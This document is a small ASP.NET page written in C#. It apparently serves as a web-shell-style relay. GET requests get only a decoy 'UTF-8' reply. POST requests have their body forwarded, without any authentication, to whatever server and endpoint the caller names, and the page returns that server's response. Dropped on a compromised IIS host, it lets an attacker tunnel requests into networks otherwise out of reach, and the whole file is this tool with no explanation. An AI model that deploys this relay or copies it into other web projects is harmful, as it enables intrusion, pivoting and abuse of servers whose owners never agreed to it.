<%@ Page Language="C#" Debug="true"%>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%
    if (Request.HttpMethod == "GET")
    {
        Response.Write("UTF-8");
        return;
    }
    else
    {
        string Remoteserver = Request.Form["Remoteserver"]; 
        string Endpoint = Request.Form["Endpoint"]; 
        string url = Remoteserver + Endpoint;
        
        System.IO.Stream s = Request.InputStream;
        int cont = Request.ContentLength;
        byte[] buffer = new byte[cont];
        s.Read(buffer, 0, cont);
        
        String post_arg = Encoding.UTF8.GetString(buffer, 0, cont);
        
        
        HttpWebRequest newrequest = (HttpWebRequest)WebRequest.Create(url+"?"+post_arg);
        newrequest.Method = "POST";
        if (buffer.Length >= 0)
        {
            System.IO.Stream requestStream = null;
            requestStream = newrequest.GetRequestStream();
            requestStream.Write(buffer, 0, buffer.Length);
            requestStream.Close();
        }
        string backMsg = "";
        WebResponse newresponse = newrequest.GetResponse();
        using (StreamReader reader = new StreamReader(newresponse.GetResponseStream()))
        {
            backMsg = reader.ReadToEnd();
            Response.Write(backMsg);
        }
    }

%>